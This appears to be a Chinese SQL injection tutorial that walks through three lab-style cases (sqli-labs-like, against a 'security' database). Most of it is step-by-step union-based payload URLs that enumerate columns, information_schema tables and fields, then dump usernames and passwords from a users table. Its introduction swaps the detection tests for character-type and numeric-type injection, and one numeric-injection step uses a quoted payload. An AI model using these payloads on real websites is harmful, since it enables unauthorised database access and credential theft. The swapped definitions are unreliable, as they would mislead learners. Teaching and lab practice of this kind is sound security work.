SQL注入原理

sql注漏洞产生需要满足两个条件

1、参数用户可控：从前端传给后端的参数内容是用户可以控制的

2、参数带入数据库查询：传入的参数拼接到SQL语句中，且带入数据库查询

常见闭合方式

1、单引号闭合：where id=’$id’

2、双引号闭合：where id =”$id”

3、单引号+括号：where id =(“$id”)

SQL注入的方式

字符型注入

SQL中的语句格式是select * from users where id =’x’

当输入1 and 1=1时页面显示正常

输入1 and 1=2时页面显示异常

满足以上两个条件则说明是字符型注入

数字型注入

SQL中的语句格式是select * from users where id=x

当输入1’and’1’=’1时页面显示正常

输入1’and’1’=’2时显示异常

满足以上两个条件则说明是数字型注入

搜索型注入

基于搜索框的注入

SQL中的语句格式是select * from databases.table where users like ‘%要查询的关键字%’

当输入 关键字%’ and 1=1 and ‘%’=’ （select * from database.table where users like ‘%关键字%’ and 1=1 and ‘%’=’%’）页面显示正常

输入%’ and 1=2 and ‘%’=’ （select * from database.table where users like ‘%关键字%’ and 1=2 and ‘%’=’%’） 页面显示异常

满足以上两个条件则说明是搜索型注入

例1（字符型注入）

随便给id传一个值

显示正常，接着判断注入类型，输入?id=1’and’1’=’1

显示正常，接着输入?id=1’and’1’=’2

显示异常，由此判断为是字符型注入

第一步 知道表格有几列，输入?id=1’ order by 1 –+若显示正常继续输入?id=1’ order by 2 –+ 以此类推直到显示异常（如果报错就是超过列数，如果显示正常就是没有超出列数），–+的作用是注释掉最后的’

输入?id=1’ order by 4–+时才出现异常

第二步 爆出显示位，就是看看表格里面哪一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的。

输入?id=-1’union select 1,2,3–+

?id=-1目的是让返回值为负数（没有id为负数），前面没数据，页面就只显示union select的内容

第三步 获取当前数据库名和版本号

输入?id=-1’union select 1,database(),version()–+

1,database(),version()：表中共有三列，所以注入的union select 也必须有三列 1起到一个占位的作用

database()函数可以回显当前使用的数据库

第四步 爆表

输入?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+（爆破指定库里的所有表名）

1,2：表示占位对齐列数

group_concat(table_name)：把该库下所有表名拼成一行，逗号分隔，避免分行显示不全

from information_schema.tables：MySQL元数据表，存着所有数据库的表信息

where table_schema=’security’：筛选条件，只选security这个库里的表

第五步 爆字段名

输入?id=-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+（爆指定表里的所有字段名）

通过上诉操作可以获得两个敏感字段名就是password和username

第六步 得到敏感字段的内容

输入?id=-1’ union select 1,2,group_concat(username ,id , password) from users–+

例二（数字型注入）

根据提示，先随便给id传一个值

显示正常，接着判断注入类型，输入?id=1 and 1=1

显示正常，接着输入?id=1 and 1=2

显示异常，判断为数字型注入

第一步 判断表格有几列 输入id=1 order by 1 –+,直到输入id=1 order by 4 –+，页面才显示异常，判断出表中公有三列

第二部 爆出显示位

输入?id=-1’union select 1,2,3–+

第三步 获取当前数据库名和版本号

输入?id=-1 union select 1,database(),version()–+

第四步 爆表

输入?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+

第五步 爆字段名

输入?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+

通过上述操作可获得两个敏感字段名为username和password

第六步 得到敏感字段的内容

输入?id=-1 union select 1,2,group_concat(username ,id , password) from users–+

例三

先输入?id=1’

根据错误信息提示，判断sql语句为单引号字符型且带有括号

验证：输入?id=1’)–+

页面显示正常

第一步 判断共有几列 输入 ?id=1’) order by 1 –+ 显示正常，直到输入 ?id=1’) order by 4 –+ 显示异常 因此判断有3列

第二步 爆出显示位

输入 ?id=-1’) union select 1,2,3 –+

第三步 爆出数据库名和版本号

输入?id=-1’) union select 1,database(),version() –+

第四步 爆表

输入?id=-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+

第五步 爆字段名

输入 ?id=-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+

第六步 得到敏感字段内容

输入?id=-1’) union select 1,2,group_concat(username,id,password) from users–+
